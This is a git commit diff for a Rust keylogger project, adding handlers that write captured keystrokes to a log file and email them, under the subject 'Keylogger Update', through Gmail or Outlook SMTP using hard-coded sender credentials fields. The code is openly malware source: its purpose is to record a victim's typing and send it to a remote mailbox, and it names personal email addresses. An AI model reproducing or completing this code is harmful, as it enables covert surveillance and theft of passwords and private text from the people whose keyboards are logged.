964ce33f158bba9b12678c64a6aee7db3216eef9
Gabriel Mendieta Hernandez <gmendieta4109@gmail.com>
2025-01-26 15:09:33 -0600

    Implemented the file and email handles, currently taping everything together

--- src/build/method.rs
+++ src/build/method.rs
@@ -1,49 +1,73 @@
-use std::fs::OpenOptions;
 use chrono::Local;
+use lettre::message::{header, Mailbox, Message};
+use lettre::transport::smtp::authentication::Credentials;
+use lettre::{SmtpTransport, Transport};
 
-use std::io::Result;
+use std::fs::OpenOptions;
 use std::io::Write;
+use std::io::{Error, ErrorKind, Result};
 
-
-trait Handle {
-    fn handle(&self, buffer : &[String]) -> Result<()>;
+fn _get_smtp_server_and_port(email: &str) -> Result<(String, u16)> {
+    if email.ends_with("@outlook.com") {
+        return Ok(("smtp-mail.outlook.com".to_string(), 587));
+    } else if email.ends_with("@gmail.com") {
+        return Ok(("smtp.gmail.com".to_string(), 587));
+    } else {
+        return Err(Error::new(
+            ErrorKind::Other,
+            "Email domain provided doesn't have support yet",
+        ));
+    }
 }
 
 pub enum Method {
     File {
-        path : String
+        path: String,
     },
     Email {
-        email     : String,
-        password  : String,
-        recipient : String
-    }
+        email: String,
+        password: String,
+        recipient: String,
+    },
 }
 
-impl Handle for Method {
-    fn handle(&self, keys : &[String]) -> Result<()> {
-        let time_stamp: String = {
-            let mut bind = String::new();
-            bind += "-------------- ";
-            bind += &Local::now().to_string();
-            bind += " --------------";
-            bind
-        };
+impl Method {
+    fn handle(&self, keys: &[String]) -> Result<()> {
         match self {
             Method::File { path } => {
-                let buffer: String = {
-                    let mut bind = String::new();
-                    bind += &time_stamp;
-                    bind += &keys.join("");
-                    bind
-                };
-                let mut file = OpenOptions::new()
-                    .append(true)
-                    .create(true)
-                    .open(path)?;
-                file.write_all(buffer.as_bytes())?;
-            },
-            Method::Email { email, password, recipient } => {}
+                let mut file = OpenOptions::new().append(true).create(true).open(path)?;
+                writeln!(
+                    file,
+                    "--------- {} ---------\n{}",
+                    Local::now(),
+                    keys.join("")
+                )?;
+            }
+            Method::Email {
+                email,
+                password,
+                recipient,
+            } => {
+                let email_packet = Message::builder()
+                    .from(email.parse().unwrap())
+                    .to(recipient.parse().unwrap())
+                    .subject("Keylogger Update".to_string())
+                    .header(header::ContentType::TEXT_PLAIN) // TEXT_HTML for HTML message
+                    .body(format!(
+                        "----------- {} -----------\n{}",
+                        Local::now(),
+                        keys.join("")
+                    ))
+                    .unwrap();
+                let credentials = Credentials::new(email.to_string(), password.to_string());
+                let (smtp_server, port) = _get_smtp_server_and_port(email)?;
+                let mailer = SmtpTransport::relay(&smtp_server)
+                    .unwrap()
+                    .port(port)
+                    .credentials(credentials)
+                    .build();
+                mailer.send(&email_packet).unwrap();
+            }
         }
         Ok(())
     }
--- src/main.rs
+++ src/main.rs
@@ -7,16 +7,25 @@
         - keyboard listening handling
 */
 mod build;
+use lettre::message::{header, Mailbox, Message};
+use lettre::transport::smtp::authentication::Credentials;
+use lettre::{SmtpTransport, Transport};
 use rdev::{
     listen, // runs a while true loop
-    Event
+    Event,
 };
 
 use std::io::Result;
-use std::thread;
 use std::sync::{Arc, Mutex};
-
+use std::thread;
 
 fn main() {
-
+    let email = Message::builder()
+        .from("rustacean101@gmail.com".parse().unwrap())
+        .to("gmendieta4109@gmail.com".parse().unwrap())
+        .subject("Keylogger Update".to_string())
+        .header(header::ContentType::TEXT_PLAIN)
+        .body("Hi, This is the message".to_string())
+        .unwrap();
+    println!("{:#?}", email);
 }
